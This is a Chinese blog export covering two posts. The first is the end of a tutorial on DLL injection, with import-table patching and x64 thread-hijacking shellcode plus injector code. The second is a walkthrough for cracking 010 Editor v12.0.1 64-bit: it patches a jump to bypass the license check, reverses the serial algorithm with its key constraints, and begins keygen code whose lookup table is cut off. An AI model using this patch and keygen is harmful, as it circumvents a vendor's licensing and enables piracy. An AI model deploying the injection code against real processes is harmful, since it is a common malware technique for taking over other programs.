除了上述在进程运行途中注入DLL的方法，还可通过修改PE文件的导入表数据，让PE文件在运行时就自动把DLL加载。\n原因是，在进程创建之初ntdll.dll就已经被映射到新进程中了，并且新进程创建后不会立马跳转到EXE文件的入口点执行代码。当我们用Windbg调试一个EXE程序时，我们会发现调试器首先暂停到了ntdll.dll内，因此我们可以判断，进程会首先进入ntdll.dll中。经过资料查找，当一个进程被创建后，它会首先执行ntdll.dll中的LdrInitializeThunk函数，该函数会调用LdrpInitializeProcess对进程一些必要内容进行初始化，然后LdrpInitializeProcess会调用LdrpWalkImportDescriptor对导入表进行处理，也即加载导入表中的DLL，并且更改进程IAT。\n因此我们对PE文件的导入表添加我们的目的DLL，即可在进程创建后自动加载。\n流程图:\n以我自己写的测试用EXE为例，该EXE运行起来后程序会先停止等待用户按下任意键，然后弹出一个含有\u0026quot;test\u0026quot;字符串的窗口。TestDll.dll为了能保证顺利注入，需要在形式上保持完整性，也就是需要有导出函数，因此添加了如下导出函数。\n1 2 3 4  __declspec(dllexport) void dummy() { return; }   TestDll.dll的入口函数会弹出一个含有\u0026quot;Injection Success\u0026quot;字符串的窗口，说明注入成功。\n我们首先检查其IDT所在空间是否还有空闲区域给我们添加目标DLL的IID结构体。\n可以看到，全0的IID结构体后紧接着就是其余的数据了，因此该IDT所在空间已经没有空间让我们添加目标DLL的IID结构体了，因此我们需要将IDT转移到足够大的空余区域。\n经过查看，发现在地址2240h以后有足够的区域，该区域在.data的virtualoffset + virtualsize里，因此能被加载至内存中。我们将IDT转移至该区域。\n因为我们更改了IDT的位置，因此在DATA_DIRTECTORY[1]中的virtualAddress和size也需要更改。2240h转为RVA为3040h，size需要加14。更改后如下图：\n接着检查该EXE是否有绑定导入表，用编辑器查看可以发现该EXE并不存在绑定导入表，即在DATA_DIRECTORY[11]的数据全为0，如下图:\n现在就需要创建目标DLL的IID结构体了。我们选择文件偏移为2320h，2330h，2340h(RVA:3120h，3130h，3140h)分别为INT、Name、IAT的地址，然后如下图填入数据。\n最后再更改IAT的属性值，赋予其可写权限，因为我们的IAT所在内存节区属于.data节区，所以我们要给.dara节区赋予可写权限，但是检查发现该节区已经拥有了可写属性。\n最后保存，运行结果如下：\n这里有个问题，也是在我做的时候碰到的问题。就是上述我给DLL添加的导出函数名称为dummy，但是我在_IMAGE_IMPORT_BY_NAME结构体的Name成员写入的不是dummy而是?dummy@@YAXXZ。如果写dummy的话就会出现如下图所示的警告\n原因是在C++编译器编译的时候会根据函数定义的一些信息，例如函数类型和函数调用约定，给函数名称添加修饰字符。我们可以通过IDA查看dummy函数被编译后添加了那些字符串。\n一般情况下，链接程序需要通过修饰字符来定位函数的正确位置，但一般情况下并不需要程序员知道函数的名字修饰，链接程序或其它工具会自动区分。在汇编程序调用C/C++函数就应该特别小心函数名称的修饰字符，因为函数名+修饰字符才能算是一个完整的函数，函数的任何相关属性改变都会导致名字修饰不再有效。这方面的知识也并不在该博客讨论的范围内，因此浅尝即止，但这个错误也让我学到了一个小知识，以及在修改导入表和导出表时需要注意这些细节。\n0x7 线程劫持注入(实现失败，并且未能找出问题所在) 这个注入方法实现失败，当我注入后，目标进程就会闪退，我尝试通过x64dbg进行调试，但是在这个情况下注入却能成功，目标DLL代码能执行，进程也不会闪退。但是离开了调试器，DLL代码就不会执行，并且进程闪退。我没能找出问题所在，但是它的思路的还是很值得学习，因此还是把这个方法的分析加进来。失败的代码也还存放在项目代码里。如果有大佬能指出问题所在，王某万分感谢。\n该方法的实现就是先把Shellcode写好，shellcode执行的是调用LoadLibrary函数，参数为目标DLL地址，然后通过将线程挂起，将线程Context的Rip改为Shellcode的起始地址，然后就能执行Shellcode并加载目标DLL了。\n流程图:\nShellcode1:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  unsigned char ShellCode [] = { 0x50, // push rax (save rax) \t0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rax, 0CCCCCCCCCCCCCCCCh (place holder for return address) \t0x9c, // pushfq \t0x51, // push rcx \t0x52, // push rdx \t0x53, // push rbx \t0x55, // push rbp \t0x56, // push rsi \t0x57, // push rdi \t0x41, 0x50, // push r8 \t0x41, 0x51, // push r9 \t0x41, 0x52, // push r10 \t0x41, 0x53, // push r11 \t0x41, 0x54, // push r12 \t0x41, 0x55, // push r13 \t0x41, 0x56, // push r14 \t0x41, 0x57, // push r15 \t0x68, 0xef,0xbe,0xad,0xde, 0x48, 0xB9, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rcx, 0CCCCCCCCCCCCCCCCh (place holder for DLL path name) \t0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // mov rax, 0CCCCCCCCCCCCCCCCh (place holder for LoadLibrary) \t0xFF, 0xD0, // call rax (call LoadLibrary) \t0x58, // pop dummy \t0x41, 0x5F, // pop r15 \t0x41, 0x5E, // pop r14 \t0x41, 0x5D, // pop r13 \t0x41, 0x5C, // pop r12 \t0x41, 0x5B, // pop r11 \t0x41, 0x5A, // pop r10 \t0x41, 0x59, // pop r9 \t0x41, 0x58, // pop r8 \t0x5F, // pop rdi \t0x5E, // pop rsi \t0x5D, // pop rbp \t0x5B, // pop rbx \t0x5A, // pop rdx \t0x59, // pop rcx \t0x9D, // popfq \t0x58, // pop rax \t0xC3 // ret // 上面的shellcode无非就是先保存现场，调用LoadLibrary，然后再还原现场，避免出错。 }   shellcode2:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  unsigned char ShellCode [] = { 0x48,0x83,0xEC,0x28, //sub rsp,28 0x48,0x89,0x44,0x24,0x18, // mov rsp+18,rax 0x48,0x89,0x4C,0x24,0x10, // mov rsp+10,rcx 0x48,0xB9,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11, //mov rcx,1111111111111111 (DLL路径) 0x48,0xB8,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22, //mov rax,2222222222222222 (LoadLibrary地址) 0xFF,0xD0, //call rax 0x48,0x8B,0x4C,0x24,0x10, // mov rcx,rsp+10 0x48,0x8B,0x44,0x24,0x18, // mov rax,rsp+18 0x48,0x83,0xC4,0x28, // add rsp,28 0x49,0xBB,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33, //mov r11,3333333333333333 (返回地址) 0x41,0xFF,0xE3 // jmp r11 }   核心代码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  // 为shellcode申请内存空间 ShellCodeAddr = VirtualAllocEx(hProcess, NULL, ScSize, MEM_COMMIT , PAGE_EXECUTE_READWRITE); //获取线程ID ThreadID = GetThreadID(dwPID); //获取线程句柄 hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID); // 将线程挂起 SuspendThread(hThread); // 设置权限，如果获取线程前不这样做就会导致无法获得上下文数据，ctx.RIP读取为0 ctx.ContextFlags = CONTEXT_CONTROL; // 获取线程上下文Context GetThreadContext(hThread, \u0026amp;ctx); //保存OldRip，并更改Rip为Shellcode地址，并修改上下文属性 OldRip = ctx.Rip; ctx.Rip = (DWORD64)ShellCodeAddr; ctx.ContextFlags = CONTEXT_CONTROL; //将返回地址，DLL路径，以及LoadLibrary地址写入Shellcode的预留空间 // shellcode1 memcpy(ShellCode + 3, \u0026amp;OldRip, sizeof(OldRip)); memcpy(ShellCode + 41, \u0026amp;pRemoteBuf, sizeof(pRemoteBuf)); memcpy(ShellCode + 51, \u0026amp;pThreadProc, sizeof(pThreadProc)); // shellcode2 //memcpy(ShellCode + 52, \u0026amp;OldRip, sizeof(OldRip)); //memcpy(ShellCode + 16, \u0026amp;pRemoteBuf, sizeof(pRemoteBuf)); //memcpy(ShellCode + 26, \u0026amp;pThreadProc, sizeof(pThreadProc));  //将shellcode写入内存 WriteProcessMemory(hProcess, ShellCodeAddr, \u0026amp;ShellCode, ScSize, NULL); //更新线程上下文 SetThreadContext(hThread, \u0026amp;ctx); // 唤醒线程 ResumeThread(hThread); //释放申请的内存 VirtualFreeEx(hProcess, ShellCodeAddr, ScSize, MEM_DECOMMIT); // 关闭句柄 CloseHandle(hThread);   我们通过编写的注入器dll_inject.exe，以及测试用exe文件通过x64dbg联调。\n首先用x64dbg加载测试用exe文件，再用x64dbg以以下命令行参数运行dll_inject.exe:\n1  \u0026#34;F:\\dll_inject\\dll_inject\\x64\\Release\\dll_inject.exe\u0026#34; HookTest.exe -i 6 TestDll.dll   我们在测试用exe文件下图出停下，然后用注入器注入DLL\n我们在线程劫持的主函数中的如下代码打上断点:\n1  ShellCodeAddr = VirtualAllocEx(hProcess, NULL, ScSize, MEM_COMMIT , PAGE_EXECUTE_READWRITE);   从而获取到Shellcode将要写入的内存空间中，该内存空间是目标进程里的空间，该次例子中的地址，以及该地址下的内容如下:\n然后再将dll_inject.exe运行到如下代码处:\n1  WriteProcessMemory(hProcess, ShellCodeAddr, \u0026amp;ShellCode, ScSize, NULL);   当注入器像目标进程写入Shellcoide后我们再观察该区域，查看Shellcode的内容(我们以shellcode2为例)，如下:\n我们可以看到地址13cc3c70018处将LoadLibraryW函数地址写入rax寄存器中，并接着调用了该函数。我们跳转至13cc3c60000地址处查看保存在rcx寄存器中的数据是什么，如下图：\n可以发现其就是Dll的路径字符串。而在x86_64中，rcx为函数调用的第一个参数，因此该过程就是调用LoadLibraryW加载目标DLL。\n再看地址13cc3c70032处保存于r11的地址，其实就是测试用exe文件暂停等待被注入器注入DLL的地址，可看上面截图测试用exe文件停止的地址。\n此时我们再查看测试用exe的RIP寄存器的值，依然是测试用exe暂停的地址。\n回到注入器，我们将代码执行到\n1  SetThreadContext(hThread, \u0026amp;ctx);   然后再次查看测试用exe的RIP的值\n可以发现RIP地址已经改变，但是我们发现此时测试用exe并不能单步调试，我们需要让注入器先把线程唤醒，执行注入器代码到\n1  ResumeThread(hThread);   此时测试用exe就能继续单步调试了,然后再调用LoadLibrary的时候就发生了EXCEPTION_ACCESS_VIOLATION异常，发生异常处在下图:\n但是未能找出原因，可以看到上面还调用了一个RtlGetFullPathName的函数，根据函数名推测其是获取DLL路径，接着判断返回值是否为有符号数，看我们触发异常的执行路径，返回值应该不为负数。通过MSDN查看该函数的返回值，获取成功后会返回字符串长度，失败则返回零，因此可以推测该函数已经获取到了DLL路径名，并返回大于0的数。但为什么会出现异常，我就不懂了。出现异常的那句指令的作用是传送对齐的封装好的单精度数，我现在的能力没能支持我找出出现异常的原因。\n接下来我们通过Shellcode1再次进行分析。\nShellcode1是直接从InjectAllTheThing中写的Shellcode复制过来的，但是依然不能实现。并且这段Shellcode我有非常多不解的疑问，这里把返回地址写入rax寄存器，但是在没保存rax当前值的情况下又将LoadLibrary的地址写入rax，并且在将参数保存到rcx之前还push了一个dummy数据，结果调用LoadLibrary后马上又pop rax，也即将dummy数据存入rax中，这样一来返回地址就丢失了，虽然最后还原了初始rax，但是ret去的地址却不知道是哪里了的。\n但是该shellcode1 依然在shellcode2出现EXCEPTION_ACCESS_VIOLATION的地方也出现了相同异常。\n但是shellcode2的逻辑是很清晰，感觉也没有什么问题的，但依然也出现了错误。\n在这测试样例情况下，此时r15值为全0，因此我更改成如下内容，让shellcode1更合理\n这样ret就能ret到push r15的地址，也就是注入前的地址，再次唤醒线程执行，发现注入成功了\n并且程序能继续正常运行到进程结束，\n但是，脱离了调试器环境，再次实行注入就会发现注入依然失败(即不能在程序中查找到目标DLL)，并且注入后程序闪退。\n我对该问题的推测，一个原因是，我在调试环境下让程序暂停在一个地址上，在该地址上注入，调用LoadLibray 以及还原现场都不会影响到原程序需要用的数据。而当我脱离了调试环境，程序会运行到system(\u0026ldquo;pause\u0026rdquo;)停下，并等待我反应。在这个情况下以这个Shellcode注入就会导致错误，例如原程序要用的数据被修改丢失等原因。\n那么我们在测试用EXE程序执行到system(\u0026ldquo;pause\u0026rdquo;)停下后在进行注入\n调试环境下，运行测试用EXE到system(\u0026ldquo;pause\u0026rdquo;)语句处，程序的RIP指向了下图所示区域\n观察此时的寄存器，我们寻找到空值的寄存器，并将返回地址保存在空闲寄存器中，以便不造成影响入栈\n我们将注入器的第一次修改的shellcode1中的r15寄存器用来保存返回地址，修改成r12用来保存返回地址。再次进行注入。\n第二次修改Shellcode1:\n运行到shellcode的起始地址，进入地址7FFDAACACDF4中查看，发现返回地址为一个ret，我们再查看此时的栈顶，栈顶存的地址也就是7FFDAACACDF4上ret将要返回的地址。\n我们继续运行测试用EXE，查看是否注入成功，发现其又在前面异常的地方发生了异常,也就是调用LoadLibray函数便发生了异常，在该函数内部。\n我之前也写过把返回地址不存入寄存器，而是存入栈里，依然会出现一样的问题。\n并且前面通过r15保存返回地址，在调试环境下却能成功注入，而脱离调试环境却不能成功还会造成程序闪退。我唯一能想到的原因就是因为存入的返回地址导致原程序需要的数据被修改或丢失。但是我没办法证明这个推测的正确性。\n因此该方法只能以失败告终。\n0x8 总结 不管是在Linux、安卓或是其他非主流操作系统，一个进程的运行离不开各种库，因此其核心思想都是相同的，无非是通过操作系统的各种机制将动态链接库或者静态库注入到目标进程，从而获取目标进程的控制权。这些技术都是好几年前的老技术了，现在很多检测与防御技术都可以轻松破解这些攻击手段。虽然技术老了，但是能学到的东西依然很多，技术本身很简单，但是亲自动手写代码，调试BUG，并在解决BUG的途中收获更多知识，才是学习的核心。反射式DLL注入是我收获最大的一项技术，这种技术需要对PE结构有非常详细的了解才能实现，这就促使我再次强化了PE文件的学习，并且还通过该方法掌握了重定位表的作用，线程劫持技术虽然没能实现成功，但是双调试器联调的经历也是非常宝贵的调试经验，个人的调试与分析汇编能力也得到了进步提高。在静态DLL注入中，也通过自己调试发现C++编译后的函数名会发生变化而导致的函数调用失败。该项目会在后续有时间的时候不断完善更新，因为DLL注入技术还有非常多值得学习的。学海无涯，下次博客再见。\n","permalink":"http://int80.top/dllinjection/","tags":["逆向"],"title":"常用DLL注入技术解析"},{"categories":["逆向"],"contents":"网上和论坛全是32位 老版本的010 editor破解的教程，没有64位版本，自己也需要用，可是软件太贵了，于是自己尝试了一下暴力和算法逆向写注册机两种方法进行破解。使用的版本是v12.0.1 64bit，在该博客发表时还是官网最新版。\n该博客仅用作个人技术学习交流，勿用于其余用途，请在自己经济条件允许的情况下支持正版。\n0x00 爆破法 把010 editor放入x64dbg运行起来，然后在tool-\u0026gt;register处随意输入序列号，此时会弹出对话框，再到x64dbg中搜索该字符串，于是可以跳转到认证序列号的代码处。\n如下图所示，当我们在使用该字符串的地址处打上断点，再次check license后就会在断点处停止\n在图中指令 mov edx,90 的上一条指令为jmp指令，如果程序从该指令以上执行下来的话便不会再执行图中的指令，那么我们可以推测程序存在某处跳转，让程序从mov edx,90指令 开始执行，如是查看 mov edx,90的交叉引用，如下图所示\n在地址7FF7F967574F处存在jne 7FF7F9675819，即跳转到mov edx,90处的指令\n那么继续往上看，地址7FF7F967574F处的jne是判断那两个数据不相同时才跳转\n如上图所示，若ebx不等于93那么就会跳转至弹出序列号不正确的代码处，如果相等则会判断edi是否等于73，如果等于则会弹出提示“密码正确，试用期延长”的窗口。我们在地址7FF7F967574F处打上断点，查看各使用的寄存器的值，以此判断是在哪些地方发生了跳转\n可以发现，edi = 117 != ED != 20C因此会直接运行到cmp ebx,93处，而此时ebx=E7 !=93，因此发生了跳转，而且edi = 117 !=71，但cmp edi,71处的跳转到的代码并不是我们所期望的，因此我们进追踪ebx有关的代码\n同时在地址7FF7F9675731处的上一条指令为jmp ，且跳转到我们并不需要的代码段处，因此可以判断该jmp在此次运行中并不会执行，那么就存在某处的jxx指令跳转到了地址7FF7F9675731，同样的查找交叉引用，发现地址7FF7F967559B处存在指令jne 7FF7F9675731，如下图所示\n可见在地址7FF7F967559B处 会判断edi是否等于EB,等于则会表明序列号正确，否则就会跳转至提示序列号错误的代码处。\n其实在这里我们就可以破解了，只需要在此处将edi改为DB即可，但这样我们每次都需要点击check license才行。\n再看地址7FF7F967558C处的 mov edi,eax 可以推测为前面的call 的函数的返回值给了edi用来判断是否等于DB，那么进入该函数分析一下，在函数开头打上断点，再次在010 editor 点击checklicense，发现程序并没有在该函数处停下来，那么我们的推测是错误的，那么就在地址7FF7F967558E与7FF7F9675595打上断点，并再次运行，会发现程序停在了7FF7F9675595处，那么肯定是存在跳转指令让程序跳转至此，直接查找交叉引用，我们可以溯源到如下图所示的代码处\n这里有两条跳转的指令，打上断点运行，判断是在从哪里跳转的\n我们需要让其在cmp edi,DB 处edi等于DB，使其不发生跳转，从而执行序列号判断正确的部分的代码，我们是从cmp edi,DB追踪edi到此，而在上图我们可以看到 在7FF7F967544A call的函数后 mov edi,eax 将返回值给了edi，那么这个edi是否就是后面cmp edi,DB会用的edi？我们打上断点，看看是否会运行这句，如果运行，该edi就会被用到cmp edi,DB，因为我们是从这里一路追踪，也只有该处更改了edi的值。\n经过测试，程序确实停在mov edi,eax处，如下图\n那么进入 7FF7F967544A处 call的函数进行分析即可\n此时RAX=E7，那么程序会跳转至7FF7F97CAE2C，那么我们查看该处代码\n可以发现这里的 eax = 177，与之前我们获取的edi = 177相同，那么此处也会存在 mov eax,DB的指令\n显然就是若该函数跳转至此那么就能使edi = DB，而跳转到该处的代码为下图\n那么我们只需要把7FF7F97CAD9D处的指令由je改为 jmp即可\n验证结果如下\n接着打补丁即可。\n0x01 逆向算法 从爆破法的破解过程我们可以发现关键函数，并且要求关键函数返回0xDB，进入关键函数查看，函数内部如图\n只有当地址7FF5EF9AD95处call的函数返回值为0x2D才能让该关键函数返回值为0xDB，那么推测序列号加密算法以及判断序列号是否正确的代码就在该7FF75EC118函数里。进入函数进行查看。\n在后面的调试可以发现在如下指令下进行了判断Name字符串以及Password字符串是否为空，寄存器rax+4分别保存着Name和Password两个字符串的长度数据，可以看到分别为0x3，0x18，转为十进制后大小与实际字符串长度相同\n并且进入地址7FFC6C84CA341处call的函数调试可知，其两个两个的取出了Password中的字符串进行运算，运算结果保存在了rdx的地址中，在之后会使用。\n可以判断该处代码正在进行Password的编码，那么该处大概率进行序列号正确的判断，进入函数7FF6C8185650进行调试，发现由两部分代码都是在重复的做某件事，\n第一部分\n进入图中 call的9QByteRef函数进行查看，可以发现这部分代码就是在判断Password每间隔4个字母是否为“-”，还可以发现这部分代码只有mov dword ptr ss:[rbp-18],X,不同，并且每次都是以大小5的幅度增加，由0x4增加到0x13，刚好判断了4个“-”\n继续往下调试会发现在做着重复的事情的第二部分代码\n进入函数BQBytreRef，跟踪调试，会发现其读取Password的数据存储在eax中，那么该函数的功能就是读取Password的单个字母\n再进入7FF6C818A1DC函数进行查看调试，会发现该函数根据al和dl寄存器的值（最初的值就是取出的Password的字母）进行判断，然后执行一些加减运算再存入eax中\n接着处理后的字母数据存入ebx，再执行shl bl,4，即把bl左移4位，接着再次调用BQByteRef的函数取出下一个Password的字母，然后对该字母再次通过函数7FF6C818A1DC对该字母进行处理，然后与上一次处理的字母以十六进制方式相加，并保存在rdi寄存器的地址中。\n该两部分代码都是在对Password进行编码处理，处理结果保存在rdi寄存器所保存的地址里。回到调用处理Password函数的代码处，即地址7FFC6C84CA341。\n我们将经算法处理后的Password数据定义为key[10]\n后面的汇编代码过于复杂，打开ida查看该处反编译得到的C代码会更容易分析。\nida查找到该处也是先找到关键字符串所在位置，即序列号识别成功后弹框的字符串，该部分代码如下图\n那么跳转至该处的关键为v17是否等于219，也就是0xDB，而v17变量值的来源如下图的函数\n进入sub_140084F4函数，会发现只有当v6 = 0x2D时才会返回219，因此可以判断该函数就为在x64dbg中我们所发现的关键函数，该函数在ida如下\n再进入sub_140006118函数查看，前面说到判断Name和Password的长度对应在C代码为\na1+8 为Name字符串数据的保存地址，a1+8+4就为Name的长度的数据，a1+16为Password字符串数据的保存地址，al+16+4就为Password的长度\n在x64dbg中地址为7FFC6C84CA341的call的函数对应到ida的函数为\n观察后面的do-while循环，我看不出这里做了什么，但是这里用到了对Password处理后的数据，似乎是在检验处理后的Password数据是否符合规定。因为这部分用到的变量并不影响后面的核心算法，因此不再分析。\n再看后面的赋值代码，由前面处理Password后的数据存放在\u0026amp;v41这个信息，以及根据ida创建变量时给的注释（v41 = [rbp-20h],v43 = [rbp-1eh]），我们可以判断Password处理后得到的数据以数组形式保存，数组起始地址为\u0026amp;v41，\u0026amp;v41-\u0026amp;v50为连续的地址，且都保存着相应地址上的处理后的数据，这也就是为什么之前我们定义为key[10]数组的原因。因此v13-v18就直接保存了经Password编码算法处理后得到的数据。\n为了验证，我们在x64dbg中查看程序运行到该处时的rbp-20h的数据，从dump中可以看到此处的数据与我们所推测的相同\n将Password通过编码算法处理后得的数据定义为key[10]数组，那么上述赋值就为v13 = key[7], v14 = key[5],v15 = key[2], v16 = key[1],v17 = key[0],v18 = key[3]\n再看switch(v44) 语句，可以判断只有当key[3]为0x9c，0xfc和0xac时才能进入第二段算法，因为该函数需要返回0x2D才能让关键函数返回0xBD，因此我们只关注能返回0x2D的分支。\n若要返回0x2D，那么该分支会跳转至LABEL_33处，那么0xfc的分支可以直接排除掉；0x9c分支并未使用key[8]与key[9]的数据，因此可以推断该分支只生成8Byte的Password；而0xac的分支使用了key[8]与key[9]，因此是可以生成10Byte的Password，我们只需分析其中一个分支就可以，这里我们分析key[3]=0xac的情况。\n这部分流程就是通过一些对key的一些数据进行计算后获取v23和v29两个主要变量，其中v23-1\u0026lt;=0x3E7，因此v23取值范围必须为[0x1,0x3E7]\n接着跳转到LABEL_26继续分析\nLOBYTE(v4)我们可以通过查看对应的汇编代码来理解其作用，这里0x0Fc是-4，那么就是使用rdx的低八位与-4相比较，如果不相等就将rsi的低八位置0。\n然后对Name进行一些格式的处理后保存在v24上，在函数sub_140004B88中传入了v24，推测是对Name字符串进行一些算法处理，进入该函数调试发现，该函数确实将Name的每个字符都进行了一些处理，并且还有一个很大的数组dword_140B34AD0保存着用来编码处理Name的数据。\n回到调用编码Name字符串函数的代码处继续分析，\n对于第一个if，我们对照汇编代码来理解，可以发现BYTE1、BYTE2、HIBYTE都是对v25进行右移后再判断\n第二个if，v18 == -100 ( 0x9c)，而我们执行的分支为v18 = 0xac因此不进入该if，同样对于if( v18 == -4 (0xfc))也跳过，因此该分支将会直接执行else if(v29)的代码，又因为我们必须渠道LABEL_33才能返回0x2D，因此v29必须大于v35\n我们追溯v35的值，发现其为加密算法函数的第三个传入参数，一直追溯到该函数调用时的汇编代码，我们可以发现，该函数的第三个参数大小为常数0x49C7\n因此v29需要大于0x49C7。\n那么以上就分析完了010 editor的算法流程\n0x02 注册机代码 在上述算法流程的分析过程我们可以发现两部分算法，第一部分是先对Password进行第一步处理获得key，然后判断key的第四个元素是不是0xac，是才能进入下一部分算法，第二部分算法先通过两个对key数据处理后得到两个变量，这两个变量再传入对Name编码的函数，这样Name和Password就产生了关系。\n我们需要反过来求key值，首先总结一下第二部分算法使用到的key值\n第一个算法为\n1 2  a1 = ((v23*0xb ^ 0x3421) - 19760)^0x7892 a1 = ((key[5]^key[2])+((key[7]^key[1])\u0026lt;\u0026lt;8))   第二个算法为\n1 2  a1 = (((((v29*0x11) ^ 0xffe53167) + 180597) ^ 0x22c078) ^ 0x5B8C27) \u0026amp; 0xffffff a1 = (key[6]^key[0])+((key[5]^key[9])\u0026lt;\u0026lt;16)+((key[8]^key[4])\u0026lt;\u0026lt;8)   再看对Name进行编码的算法函数使用的参数为v24(转换格式后的Name字符串)、v4 = 1(因v18!=-4)、v22 = v29、(a1+48)=v23，并且编码后的数据赋予v25，然后在判断v25的低8位、低16位、高32位、高64位是否分别等于key[4]、key[5]、key[6]、key[7]，\n而我们所执行的分支要求必须相等，因此我们也就可以对Name编码后求出key[4 - 7]的数据。\n当我们获得key[4 - 7]的数据后，就可以再通过逆向求解对key数据编码的两个算法就能获得其余key的数据，但是这里有一个问题，就是我们缺少v29 以及 v23两个关键数据进行算法逆向计算。\n在之前的流程分析，我们可以发现v23的取值在[0x1,0x3E7]之间，v29必须大于0x49C7，那么我们只需要在两个变量的取值范围随机取值即可，可以给两个变量赋符合条件的常数，也可以通过rand() % 0x3E7获得v23，rand() + 0x49C8获得v29。在这里我们直接给常数即可。\n到后面我发现v23 变量是一对Name和Password可以使用的用户数量，v29是和使用期限有关的数据。\n综上，注册机的思路理清，那么就可以开始写代码了。\n在此之前我们需要获取Name编码时所需要的大数组数据，我们通过x64dbg调试到编码Name的函数里(因为我们填的Name以及Password不能让程序执行到这，因此需要手动更改程序跳转条件，让程序能够执行到编码Name的函数)。我们在ida查看该数组会发现后面还接了0x34大小的0数据，因此我们在复制的时候还需要考虑这个细节。\n首先是对Name编码的算法，我们直接参照ida反编译的代码进行编写\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  DWORD LockName[] = { 0x39CB44B8, 0x23754F67, 0x5F017211, 0x3EBB24DA, 0x351707C6, 0x63F9774B, 0x17827288, 0x0FE74821, 0x5B5F670F, 0x48315AE8, 0x785B7769, 0x2B7A1547, 0x38D11292, 0x42A11B32, 0x35332244, 0x77437B60, 0x1EAB3B10, 0x53810000, 0x1D0212AE, 0x6F0377A8, 0x43C03092, 0x2D3C0A8E, 0x62950CBF, 0x30F06FFA, 0x34F710E0, 0x28F417FB, 0x350D2F95, 0x5A361D5A, 0x15CC060B, 0x0AFD13CC, 0x28603BCF, 0x3371066B, 0x30CD14E4, 0x175D3A67, 0x6DD66A13, 0x2D3409F9, 0x581E7B82, 0x76526B99, 0x5C8D5188, 0x2C857971, 0x15F51FC0, 0x68CC0D11, 0x49F55E5C, 0x275E4364, 0x2D1E0DBC, 0x4CEE7CE3, 0x32555840, 0x112E2E08, 0x6978065A, 0x72921406, 0x314578E7, 0x175621B7, 0x40771DBF, 0x3FC238D6, 0x4A31128A, 0x2DAD036E, 0x41A069D6, 0x25400192, 0x00DD4667, 0x6AFC1F4F, 0x571040CE, 0x62FE66DF, 0x41DB4B3E, 0x3582231F, 0x55F6079A, 0x1CA70644, 0x1B1643D2, 0x3F7228C9, 0x5F141070, 0x3E1474AB, 0x444B256E, 0x537050D9, 0x0F42094B, 0x2FD820E6, 0x778B2E5E, 0x71176D02, 0x7FEA7A69, 0x5BB54628, 0x19BA6C71, 0x39763A99, 0x178D54CD, 0x01246E88, 0x3313537E, 0x2B8E2D17, 0x2A3D10BE, 0x59D10582, 0x37A163DB, 0x30D6489A, 0x6A215C46, 0x0E1C7A76, 0x1FC760E7, 0x79B80C65, 0x27F459B4, 0x799A7326, 0x50BA1782, 0x2A116D5C, 0x63866E1B, 0x3F920E3C, 0x55023490, 0x55B56089, 0x2C391FD1, 0x2F8035C2, 0x64FD2B7A, 0x4CE8759A, 0x518504F0, 0x799501A8, 0x3F5B2CAD, 0x38E60160, 0x637641D8, 0x33352A42, 0x51A22C19, 0x085C5851, 0x032917AB, 0x2B770AC7, 0x30AC77B3, 0x2BEC1907, 0x035202D0, 0x0FA933D3, 0x61255DF3, 0x22AD06BF, 0x58B86971, 0x5FCA0DE5, 0x700D6456, 0x56A973DB, 0x5AB759FD, 0x330E0BE2, 0x5B3C0DDD, 0x495D3C60, 0x53BD59A6, 0x4C5E6D91, 0x49D9318D, 0x103D5079, 0x61CE42E3, 0x7ED5121D, 0x14E160ED, 0x212D4EF2, 0x270133F0, 0x62435A96, 0x1FA75E8B, 0x6F092FBE, 0x4A000D49, 0x57AE1C70, 0x004E2477, 0x561E7E72, 0x468C0033, 0x5DCC2402, 0x78507AC6, 0x58AF24C7, 0x0DF62D34, 0x358A4708, 0x3CFB1E11, 0x2B71451C, 0x77A75295, 0x56890721, 0x0FEF75F3, 0x120F24F1, 0x01990AE7, 0x339C4452, 0x27A15B8E, 0x0BA7276D, 0x60DC1B7B, 0x4F4B7F82, 0x67DB7007, 0x4F4A57D9, 0x621252E8, 0x20532CFC, 0x6A390306, 0x18800423, 0x19F3778A, 0x462316F0, 0x56AE0937, 0x43C2675C, 0x65CA45FD, 0x0D604FF2, 0x0BFD22CB, 0x3AFE643B, 0x3BF67FA6, 0x44623579, 0x184031F8, 0x32174F97, 0x4C6A092A, 0x5FB50261, 0x01650174, 0x33634AF1, 0x712D18F4, 0x6E997169, 0x5DAB7AFE, 0x7C2B2EE8, 0x6EDB75B4, 0x5F836FB6, 0x3C2A6DD6, 0x292D05C2, 0x052244DB, 0x149A5F4F, 0x5D486540, 0x331D15EA, 0x4F456920, 0x483A699F, 0x3B450F05, 0x3B207C6C, 0x749D70FE, 0x417461F6, 0x62B031F1, 0x2750577B, 0x29131533, 0x588C3808, 0x1AEF3456, 0x0F3C00EC, 0x7DA74742, 0x4B797A6C, 0x5EBB3287, 0x786558B8, 0x00ED4FF2, 0x6269691E, 0x24A2255F, 0x62C11F7E, 0x2F8A7DCD, 0x643B17FE, 0x778318B8, 0x253B60FE, 0x34BB63A3, 0x5B03214F, 0x5F1571F4, 0x1A316E9F, 0x7ACF2704, 0x28896838, 0x18614677, 0x1BF569EB, 0x0BA85EC9, 0x6ACA6B46, 0x1E43422A, 0x514D5F0E, 0x413E018C, 0x307626E9, 0x01ED1DFA, 0x49F46F5A, 0x461B642B, 0x7D7007F2, 0x13652657, 0x6B160BC5, 0x65E04849, 0x1F526E1C, 0x5A0251B6, 0x2BD73F69, 0x2DBF7ACD, 0x51E63E80, 0x5CF2670F, 0x21CD0A03, 